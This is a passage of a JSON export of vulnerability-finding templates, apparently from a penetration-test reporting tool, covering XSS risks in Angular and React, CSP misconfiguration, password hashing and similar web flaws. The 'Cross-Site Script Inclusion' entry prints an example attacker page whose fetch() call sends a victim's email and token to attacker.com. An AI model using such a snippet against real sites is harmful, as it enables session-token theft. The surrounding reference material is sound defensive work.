password hashing is implemented on the server. Additionally, the application should use transport-level encryption (SSL or TLS) to protect all sensitive communications, including passwords. Passwords that are hashed on the client should be rehashed by the server (upon password change and during authentication).\nThe first step toward securely storing passwords server-side involves generating a random, fixed-length token (or \"salt\") when the clear-text password is about to be stored in the database:\nSALT = rand( 64Bytes )\nThe salt value and clear-text password should then be combined and hashed using a cryptographically secure hashing algorithm such as SHA-256. The concatenated password and salt can also be stored using an HMAC that utilizes SHA256.\nOUT = HMAC_SHA256( KEY, CONCAT( PW, SALT )  ) + \":\" + SALT\nOnce the password is salted and hashed, the hash and plaintext salt can be stored in the database alongside the username.\nAlternatively, the password can be stored using an adaptive hash function, for example, pbkdf2, bcrypt, or scrypt. Developers must specify a \"work factor\" for such functions. This parameter's value will change depending on the chosen function, but should be tuned to execute in 1/100th of a second (lower/higher depending on the peak user load requirements) in the production environment.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":750,"plugin_id":null,"title":"Angular - Untrusted Input Sent to Angular Element","type":null,"description":"The application uses untrusted input in angular.element functions. Angular's global angular.element function enables access to functions with similar functionality as the JQuery language, such as append(), prepend(), and replaceWith().\nUsing untrusted input in the element functions may lead to cross-site scripting and HTML injection vulnerabilities.\n","poc":null,"impact":"An attacker can alter the page content displayed to the victim via an HTML injection and execute application functions using the victim's application identity via cross-site scripting.\n","remediation":"Sanitize user input before sending it to the angular.element functions with functions like $sce.getTrustedHtml or $sanitize. The getTrustedHtml function strips and encodes the input so that it becomes harmless. The $sanitize function works similarly. If there is a requirement to render HTML, use the getTrustedHtml function and configure it to trust a safe subset of HTML. By default, the function strips and encodes all HTML.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":751,"plugin_id":null,"title":"Angular - Untrusted Input in Route Template Strings","type":null,"description":"The route template string is concatenated with user input without sanitization or encoding. Client-side routing within an AngularJS application can be implemented using the built-in module ngRoute or a third party module AngularUI Router (ui.router). The $routeProvider from ngRoute or $stateProvider from ui.router can be used to configure these routes. When rendering templates one can either define a templateUrl where a URL can be provided, or use a template value in the form of a string or a function. The template string can be static or concatenated with user input (e.g. location.href). The function can be used to create a dynamic string to represent the template. Such routes exist for simple pages, such as for performing redirection or for displaying error messages. When a template is first used, it is loaded into the $templateCache for quick retrieval. \nIf the route template string contains user input, such as location.href, then the application is vulnerable to Cross-site scripting as well as expression injection since Angular does not perform sanitization on those strings. Additionally, if the application uses the $templateCache.put method inside an Angluar run block with untrusted input then an XSS is also possible, as it bypasses the necessity to dynamically retrieve the template via a URL.\n","poc":null,"impact":"This vulnerability leads to cross-site scripting (XSS) and expression injection. An attacker can thus arbitrarily alter the page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application.\n","remediation":"Avoid using sources of untrusted data within the template. When user input must be included in the template, it should be displayed through an Angular expression which will automatically output encode the input. Where possible, use the templateUrl instead of a dynamic template as it enables the application to load static pages.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":752,"plugin_id":null,"title":"Angular - Incorrect Sanitization Mode for Angular Translate","type":null,"description":"The application has not configured the internationalization library angular-translate to encode or escape untrusted input. The angular-translate module is an internationalization library, but can be used to provide configuration-driven transformation of content for any purpose. The module can be configured to escape or sanitize content using many strategies, such as 'null', 'escape', 'sanitize', 'escapeParameters', or 'sanitizeParameters'. The 'null' strategy or an empty string used in the configuration means that angular-translate will not sanitize any input at all. This is the default value for angular-translate versions prior to 3.0.\nUnlike standard Angular output, with angular-translate, content is not encoded or escaped by default with Strict Contextual Escaping. The developer must explicitly set the escape functionality or manually escape the data in the translate strings.\n","poc":null,"impact":"Using an incorrect sanitization mode, such as the default 'null' strategy, may lead to cross-site scripting vulnerabilities. These vulnerabilities give an attacker control of the user's browser. The attacker can arbitrarily alter page content displayed to the victim and execute application functions using the victim's application identity if the victim is authenticated to the application.\n","remediation":"All code using angular-sanitize version prior to 3.0 should have a safe strategy set explicitly inside the config block. The 'escape' strategy is the most secure option, since it will protect even tainted template strings from XSS. If HTML must be present in the template string, then 'escapeParameters' can be used, which will leave the HTML present in the template string unaffected. Note that it is possible to combine strategies, such as [sanitize, escape]. Combining these two strategies allows filtering out dangerous HTML, then escaping the remaining HTML as entities. \nIf the angular-sanitize module is available, then the combination [sanitize, escapeParameters] will prevent unsafe HTML from being used in translation strings and force all user input to be displayed as plain text. In this case, XSS is prevented in user input while still allowing only safe HTML to be legitimately used by developers inside translation strings.\n","cvss_base_score":8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:28:33","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":753,"plugin_id":null,"title":"LoadBytes Usage (Flex)","type":null,"description":"The class LoadBytes is being used in the application SWF file. The LoadBytes class allows a SWF file to programmatically make changes to the byte code of the SWF. This functionality can be abused by an attacker to completely change the execution environment by loading a malicious SWF into the current security domain, as well as store malware payloads.\n","poc":null,"impact":"\n","remediation":"Variables that are used by the LoadBytes class should not accept user defined values.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":754,"plugin_id":null,"title":"Angular - XSS in TypeAhead Plugin","type":null,"description":"The application uses untrusted data in the uib-typeahead directive without sanitization. Typeahead is an AngularJS version of Bootstrap v2's typeahead plugin used to create typeaheads within text input. \nThe application is vulnerable to cross-site scripting (XSS) when untrusted data is bound via the uib-typeahead directive and the ngSanitize module is not included in the application dependencies. Moreover, angular-ui bootstrap versions prior to 0.13.4 are also vulnerable to XSS as they do not sanitize untrusted data by default.\n","poc":null,"impact":"As the application is vulnerable to XSS, an attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application.\n","remediation":"Use ngSanitize with angular-ui bootstrap version greater than 0.13.3. If the uib-typeahead version is prior to 0.13.3, update the plugin to the version equal or greater than 0.13.3. The uib-typeahead version greater than 0.13.3 is used, inluce ngSanitize module to sanitize HTML in the typeahead strings automatically.\n","cvss_base_score":8,"cvss_temporal_score":7,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P/E:H/RL:OF/RC:C/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:28:44","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":755,"plugin_id":null,"title":"Angular - Insecure Client-Side Logging","type":null,"description":"The application is logging sensitive information insecurely on the client side. HTML5 introduced the concept of WebStorage which gives developers the ability to store data locally on the client rather than on the server. For performance reasons, developers may be inclined to queue application logs in WebStorage and then persist a batch of logs to the server rather than sending individual log messages.\nThe default $log (an Angular service for logging) implementation safely writes log message into the browser's console. However, the $log service can be overwritten with the $provide service inside the Angular module config() function possibly allowing the insecure storage of the data in the logs.\n","poc":null,"impact":"Application client-side logs may contain items such as error messages, stack traces, system information, or sensitive client data which should not be written to local storage as:\n--Local storage does not have an expiration date, and will live forever on the client's computer, unless it is explicitly removed by the application or by the user.\n--Multiple applications hosted on the same origin will be able to access each other's local storage data.\n--Data will persist in local storage until it is explicitly cleared. Even if data is explicitly cleared on logout, this approach is still insecure. If a user simply closes the browser without going through the logout process, the local storage data will still persist indefinitely.\n\n","remediation":"Developers should not overwrite the default $log service to write logs to local storage. If application logs must be cached on the client, then session storage should be used and logs should be explicitly cleared on logout. In the event that a user navigates away from the application without logging out, the logs stored to session storage will be automatically cleared when the browser window is closed (unlike local storage where data will persist indefinitely).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":756,"plugin_id":null,"title":"Angular - Potentially Untrusted Domains Added to Resource Whitelist","type":null,"description":"The application permits potentially untrusted domains through the resource whitelist. Within an AngularJS application, the resource whitelist is defined by the $sceDelegateProvider provider and is used to ensure AngularJS templates are only loaded from trusted locations. The $sceDelegateProvider by default allows loading of templates only from the application's domain. It blocks loading templates from other domains or loading templates over HTTP for a document served over HTTPS. However, it is possible to load templates from other domains or protocols by either creating custom whitelists and blacklists for matching URLs and changing the configuration of $sceDelegateProvider, or by marking URLs trusted using Strict Contextual Encoding service. \nMisconfiguration of $sceDelegateProvider.resourceUrlWhitelist can occur through one of the following mistakes:\n--Accepting any domain. The usage of double asterisks (**) as the sole parameter within the whitelist configuration enables developers to load resources from the other domains. This configuration does not limit which domains or protocols are allowed and effectively allows loading resources from any place, including potentially malicious sources.\n--Double asterisk (**) in domain. Configuring the whitelist using double asterisks (**), such as 'https://**.google.com/**' can permit an attacker to create a URL to a malicious domain such as https://malicious.com/?foo=.google.com/. In this example, an attacker can customize the URI from a malicious domain and the resource would still be accepted because the portion 'malicious.com/?foo=' matches the ** criteria.\n--Loading resources over HTTP instead of HTTPS. Configuring the whitelist with HTTP, for example, as 'http://ajax.googleapis.com/ajax/libs/angularjs/**', leaves the application vulnerable to a Man-in-the-Middle attack. An attacker with access to the network path between the client and the resource server can intercept such requests and modify the response, potentially adding malicious content to the template loaded.\n\n","poc":null,"impact":"Misconfiguration of the resource whitelist can lead to issues such as: \n--Rendering malicious content on the user's browser resulting in cross-site scripting, as Angular templates may contain malicious expressions that would be able to manipulate user data and forge user actions on the page.\n--Man-in-the-middle (MITM) attacks that can expose the data in transit between a client and a server compromising confidentiality and integrity.\n\n","remediation":"Use $sceDelegateProvider  with default setting unless a whitelist is absolutely required. If a whitelist needs to be created, they must comply with the best practices and include domains which are knows as vetted as trusted.\nThe trusted locations listed in the $sceDelegateProvider whitelist should follow these best practices when configuring the allowed resources:\n--Configure the specific protocol and domain or subdomain(s) for the resources you trust.\n--Do not use the double asterisk (**) wildcard as part of the protocol, as this will allow arbitrary protocols.\n--Do not use the double asterisk (**) wildcard as part of the domain, as this will allow arbitrary domains. Single asterisks (*) are safe in the subdomain portion.\n--Only use the double asterisk (**) wildcard at the end of the URL. This will allow any directory or file while limiting access to the trusted servers only.\n--Ensure resources are loaded over a secure protocol (e.g., only allow https:// URLs).\n--Only use the $sce.trustAsResourceUrl on URLs which are trusted, and ensure the protocols and domains are correct to prevent insecure sourcing of Angular templates.\n\nThe method $sce.trustAsResourceUrl can be used to override what's defined in $sceDelegateProvider.resourceUrlWhitelist. It does not matter if a URL is outside the whitelist or in the blacklist. If the controller or component rendering the resource calls $sce.trustAsResourceUrl, it will render the URL regardless of the configuration in $sceDelegateProvider.\n","cvss_base_score":3.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":757,"plugin_id":null,"title":"Insecure Content-Security-Policy Header","type":null,"description":"The application sets an insecure Content-Security-Policy (CSP) header which eliminates protections provided by CSP. The Content Security Policy instructs the browser to only fetch resources, such as scripts, images, or objects, from the specified locations. A compliant browser will deny loading any resources from locations not listed in the policy. \nThe CSP header in the application has one or several of the following insecure settings:\n--default-src directive not set, leaving all the directives not explicitly listed in the policy wide open, thus allowing resources to be loaded from any location. \n--default-src, script-src, or object-src directives set to 'unsafe-inline' or 'data:', which will allow the execution of JavaScript injected as an inline script or a 'data:' source. \n--default-src or script-src directives set to 'unsafe-eval', which removes the protection from JavaScript code injection attacks. \n--content source directives, such as child-src, connect-src, default-src, font-src, frame-src, img-src, media-src, object-src, script-src, and style-src, set to *, which leaves the application open to potential XSS or scriptless attacks.\n--script-src or default-src set to 'self' for hosts containing Angular applications, JSONP endpoints, or files uploaded from users, which may allow attackers to manipulate the application into executing code uploaded by the attackers.\n--frame-ancestors and form-action directives set to *, which leaves the application open to potential navigation attacks.\n--any directive set to third-party URIs that use HTTP protocol instead of HTTPS, which allows attackers to modify the loaded resources via MiTM attacks.\n\n","poc":null,"impact":"When implemented correctly, the CSP reduces an attacker's ability to inject malicious content and helps protect a web page from attacks like cross-site scripting (XSS), dynamic code execution, clickjacking, remote file inclusion (RFI), and others. An insecurely configured policy removes the additional line of defense that a CSP could provide and hence increases the overall security risk.\n","remediation":"Configure a strong Content Security Policy with the appropriate directives defined to provide the browser with granular control over the resources loaded by the application.\nHere is an example of a secure CSP.\n<pre><code class=\"HTTP\">Content-Security-Policy: default-src 'none'; img-src *.images.example.com; media-src media-server.com; script-src apis.example.com; style-src 'self'; object-src 'none'; frame-ancestors 'self'; upgrade-insecure-requests; report-uri https://example.com/csp-reports/ </pre>\nTo configure a strong Content Security Policy, follow these best practices:\n-- Specify a default policy. It is recommended to set it to 'none'.\n--Avoid setting default-src and script-src to 'unsafe-inline' or data:. The 'data:' URIs can be used to inject and execute JavaScript.\n--Avoid setting default-src and script-src to 'unsafe-eval'. The 'unsafe-eval' policy allows the use of eval() and similar methods which can be abused for code injection.\n--Specify a whitelist of sources for content source directives (child-src, connect-src, default-src, font-src, frame-src, img-src, media-src, object-src, script-src, and style-src) and do not set these direcitves to *.\n--Avoid setting script-src or default-src to 'self' for hosts containing Angular applications, JSONP endpoints, or files uploaded from users, as attackers can manipulate such applications to execute attacker's code uploaded to the application's host.\n--Avoid setting the frame-ancestors and form-action directives to *, as it may allow clickjacking and form data hijacking attacks.\n--Only use third-party URIs that start with https:, as content loaded over HTTP can be modified by an attacker. \n\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":758,"plugin_id":null,"title":"React - Passing Insecure State with Server Side Rendering","type":null,"description":"The application uses server-side rendering and passes state to the page in an insecure manner, which may lead to an XSS. React applications use server-side rendering (SSR) to improve performance characteristics. To do so, the application renders a page on the server side and sends the resulting HTML to the browser. Before client-side React code starts processing the page, the application needs to pass the state contained in a JSON object which is set to a global variable.\nNote that this vulnerability may occur regardless of the technology used to maintain the state. \nThe problem arises when the state added to the page contains unvalidated and unencoded user input. The automatic output encoding performed by React does not apply as the state is written into the HTML page before the React code processes the page. Even though the state is written into a JSON object, it is possible to inject a script tag that will be processed by the browser as HTML markup and the injected script will be executed.\n","poc":null,"impact":"An attacker may abuse such a vulnerability by supplying a malicious JavaScript through the state, which, when rendered, will allow the attacker to execute the same actions that a user can execute, such as reading sensitive data or performing sensitive actions.\n","remediation":"Perform JavaScript-encoding of the state before assigning it to the global variable on the page. In addition, the state variables sent from the server must be validated on the server. However, at the minimum, the state content must be output encoded in JavaScript context to avoid possible injections. The encoding can be performed using the serialize-javascript package.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":759,"plugin_id":null,"title":"Insecure Link Target","type":null,"description":"The application contains links to untrusted pages, which, once opened in a new tab, can replace the page in the original tab with a phishing page. When a malicious page is opened by clicking on an untrusted link with the target attribute set to \"_blank\", that page has a window.opener object, which provides a handle to the original page. This handle does not provide access to the document object of the original page, but it does provide access to the location property. \nThe newly opened malicious page may send the original page to any URL by setting window.opener.location property, even if the two pages come from different origins. Note that the malicious page does not have access to any data on the orinigal page, and thus, it cannot steal any sensitive information from it.\n","poc":null,"impact":"The malicious page can redirect the original page to a phishing site made to look like the original page asking for login credentials or other sensitive information. Thus, a phishing attack may be executed.\n","remediation":"To prevent untrusted pages linked from the application from being able to manipulate window.opener object, set rel=noopener in each link tag. When the rel attribute is set to noopener, the window.opener object is null on the new page. Therefore, the attacker cannot manipulate the navigation of the original page. Note that the rel=\"noopener\" attribute setting is supported by Firefox, Chrome, and Safari browsers and is not supported by Internet Explorer and Edge. For the latest information on support refer to https://caniuse.com/#search=rel.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":760,"plugin_id":null,"title":"URL Attribute Injection","type":null,"description":"The application sets an HTML attribute that accepts a URL from unsanitized data provided by the user, thus allowing a malicious user to execute cross-site scripting. There are various HTML tags with attributes that accept a URL, for example, an anchor tag <a> accepts a URL in the href attribute to redirect a user to another page. Some of these attributes also allow execution of JavaScript by accepting the \"javascript:\" or the \"data:\" schemes. Note that a large portion of URL attributes do not accept the \"javascript:\" or \"data:\" schemes, but there are certain ones that do, and they can execute JavaScript as a result. This behavior is also different based on a browser and its version. \nFor example, if untrusted input with \"javascript:\" scheme is provided to the href attribute of the achor tag <a>, the JavaScript will be executed in any browser. But if the same untrusted input is set to the src attribute of the <embed> tag, the attack will work in some versions of Firefox  but not in Chrome. However, if the untrusted input uses the \"data:\" scheme, the injection will work with the src attribute of the <embed> tag in certain versions of Firefox.\n","poc":null,"impact":"An attacker may abuse such application functionality by supplying malicious JavaScript, which, when rendered, will allow the attacker to execute the same actions that a user can execute, such as reading user's private data or performing sensitive actions.\n","remediation":"Whenever using user input to set a URL value to an HTML attribute, perform whitelist validation of the value. The following is the list of HTML tags and their attributes that accept URLs with \"javascript:\" and/or \"data:\" schemes and execute them in one or more modern browsers. \n--\n--\n--\n--\n--\n--\n--\n\nWhen trying to sanitize a user-provided URL, do not use blacklist regex or pattern matching, such as checking if the string starts with \"javascript:\", because an attacker may bypass the blacklist by sending a string like \" javascript:\", where the scheme is prepended with one or more spaces. It is recommended to use a whitelist approach and only allow expected protocols, such as \"https:\".\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":761,"plugin_id":null,"title":"React - InnerHTML Set to Untrusted Data","type":null,"description":"The application insecurely sets the innerHTML property which may lead to cross-site scripting. By default React does not modify the innerHTML property when setting a value to a DOM element. Thus, it automatically protects applications from cross-site scripting and HTML injections. However, it is possible to bypass this protection by setting the dangerouslySetInnerHTML prop directly.\nThe application uses unvalidated user input to set the dangerouslySetInnerHTML prop on a React component. If the user input contains malicious JavaScript or HTML payload, it will lead to cross-site scripting or HTML injection, since the input will be injected into the DOM and rendered by the browser as is.\n","poc":null,"impact":"An attacker may be able to supply malicious JavaScript, which, when rendered, will allow the attacker to execute the same actions that a user can execute, such as reading sensitive data or performing sensitive actions.\n","remediation":"Sanitize data before outputting through the dangerouslySetInnerHTML prop into the innerHTML property. When outputting user data, it is best to perform output encoding to protect the application from cross-site scripting attacks. In React applications this can be done by simply outputting user data in the curly braces in JSX. However, if the application functionality requires including HTML tags in the output and the dangerouslySetInnerHTML prop must be used, the data must be first sanitized using a reliable sanitization library, such as the latest version of DOMPurify. The DOMPurify library outputs a safe subset of HTML tags which do not allow execution of any JavaScript.\n","cvss_base_score":3.6,"cvss_temporal_score":2.7,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:P/A:N/E:POC/RL:W/RC:UC)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":762,"plugin_id":null,"title":"DOM XSS via Insecure Element Reference","type":null,"description":"The client-side application uses a direct element reference in a JavaScript framework to set untrusted value to a DOM element. Many client-side JavaScript frameworks wrap access to DOM elements with their APIs to perform contextual output encoding to prevent cross-site scripting (XSS). However, these frameworks often also have a way to reference DOM elements directly.\nWhen using such a direct reference, a developer may access the underlying native DOM element and set values to any of its attributes, such as innerHTML, outerHTML, src, call native JavaScript functions, such as appendChild(), querySelector(), or access parent elements (and parent of a parent, etc.) and in such way traverse the whole DOM tree. Using untrusted data to set DOM element attributes or call DOM functions through element reference leads to DOM-based XSS.\n\n","poc":null,"impact":"As the application is vulnerable to XSS, an attacker can arbitrarily alter page content displayed to the victim and execute application functionality using the victim's application identity if the victim is authenticated to the application.\n","remediation":"Avoid using element reference to modify the DOM elements directly, and instead use the APIs provided by the JavaScript framework to safely access and modify the underlying DOM elements. Using element references in a JavaScript framework may be especially misleading, since the framework provides an XSS protection through contextual output encoding. However, this protection does not apply when DOM elements are referenced and modified directly. Therefore, such access should be avoided. If that is not possible, the application must validate data before setting it through a direct element reference.\n","cvss_base_score":6.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":763,"plugin_id":null,"title":"Cross-Site Script Inclusion","type":null,"description":"A cross-site script inclusion vulnerability occurs when a web application returns dynamically generated JavaScript containing sensitive information like usernames, email address, session IDs, tokens, etc. These scripts may be included into the page via <script> tags or may be requested via an XHR or a fetch request, and are generated dynamically on the server per user, based on the user's session. However, the vulnerability exists because these same scripts may be included via <script> tags in a malicious page. When a user with an active session visits that malicious page, provided cookies are used to maintain the session, a script with user-specific information will be returned. Since scripts are exempt from the same origin policy, the attacker's page will be able to read the sensitive values in the dynamically generated script through JavaScript constructs. \nFor example, the victim site generates the following script called user_details.js for each logged in user. \n<pre><code class=\"javascript\">(function() {   window.username = 'jdoe';   window.email = 'jdoe@example.com';   window.token = '0hn6Ht56WfvOOZeVELrF'; })(); </pre>\nThe attacker includes a <script> tag loading this script into the malicious page and tricks the user to visit the attacker's page while having an active session with the victim site. The following JavaScript in the attacker's page reads the sensitive information and sends it to the attacker-controlled server.\n<pre><script src=\"https://www.example.com/user_details.js\" /> <script>   var useremail = window.email;   var usertoken = window.token;   fetch('https://attacker.com/harvest_data?email='+useremail+'&token='+usertoken)   .then(function(response) {     ...   }); </script> </pre>\n","poc":null,"impact":"Cross-site script inclusion results in leaking sensitive information about the user, such as user's login state, username, email, address, phone number, or location. This information can be used to launch a customized social engineering attack. In some cases, information like session IDs or tokens can be stolen through a dynamic script inclusion which may lead to account compromise.\n","remediation":"--Do not send sensitive data in a JavaScript format dynamically, instead send user-specific information as a JSON object via XHR or fetch requests. Note that an attacker cannot read the JSON data included into an attacker's page, provided a user is using a modern browser. There were certain browser versions vulnerable to JSON hijacking in the past.\n--Use unpredictable URL to load the dynamically generated JavaScript. One prerequisite for this attack is that the attacker must know the exact URL to request the script. Adding an unpredictable value to the URL path will prevent the attacker from successfully including the script into a malicious page.\n--Use an XSRF token to generate user-specific responses. This token should not be guessable by the attacker and should be sent via an HTTP header, and not a cookie.\n--Use SameSite cookies for session management, provided users are only using the browsers that support SameSite cookies.\n\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N/E:F/RL:TF/RC:C/CDP:LM/TD:L)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":764,"plugin_id":null,"title":"ENABLEDEBUGGER2 Tag Detected (FLEX)","type":null,"description":"A SWF file in the application include the ENABLEDEBUGGER2 tag. The presence of this tag enables remote debugging, as well as contains a cryptographically insecure salted hash of the password used to secure the file. Flash currently only uses a 16 bit salt to create an MD5 hash of the password. With a 16 bit salt and a hash created by an insecure algorithm an attacker can recover the password giving them full range to the debugging functionality enabled by the ENABLEDDEBUGGER2 tag.\n","poc":null,"impact":"\n","remediation":"Remove remote debugging from all production Flash applications. Ensure you are not using the -debug-password command line parameter when invoking the Flash compiler.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":765,"plugin_id":null,"title":"Vulnerable Server Version","type":null,"description":"The web or application server has known published vulnerabilities. Published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. Depending on the nature of these vulnerabilities, this could allow an attacker to compromise the server and any data stored within.\n","poc":null,"impact":"Usage of a web or application server platform with known vulnerabilities opens up any data stored or application hosted on the server to exploitation.\n","remediation":"Upgrade or patch the web or application server to a version which does not currently have any known vulnerabilities. Furthermore, as soon as it is identified that the server version is vulnerable to an attack, preventative measures should be taken to mitigate the vulnerability until an upgrade or patch is released.\n","cvss_base_score":5.1,"cvss_temporal_score":4,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:P/A:P/E:POC/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":766,"plugin_id":null,"title":"Apache Struts Error Message Cross-Site Scripting","type":null,"description":"The application utilizes Apache Struts, an open source framework for building web applications. Certain versions of Apache Struts contain error pages vulnerable to cross-site scripting attacks. When requesting a non-existent resource, the request URL is reflected in the error response as-is, without validation or encoding. As a result, it is possible to request [XSS payload].do resource, and the HTML + JavaScript code in [XSS payload] will be executed when the error message is returned.\n","poc":null,"impact":"\n","remediation":"Upgrade to the latest version of Apache Struts, which can be obtained from the vendor site.\n","cvss_base_score":8,"cvss_temporal_score":7,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P/E:H/RL:OF/RC:C/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":767,"plugin_id":null,"title":"File Path Disclosure","type":null,"description":"The application discloses absolute internal file paths. These file paths can be revealed in the client-side source-code utilized by the application, or as parameters passed within the application. This information gives an attacker details about the operating system used by the server or developer, and may also give an attacker additional details on what technologies the application utilizes. An attacker would be able to use this information to limit attacks and techniques to those technologies used by the application which could make it easier to find and exploit a vulnerability.\n","poc":null,"impact":"\n","remediation":"Remove any reference to absolute file paths that can be revealed 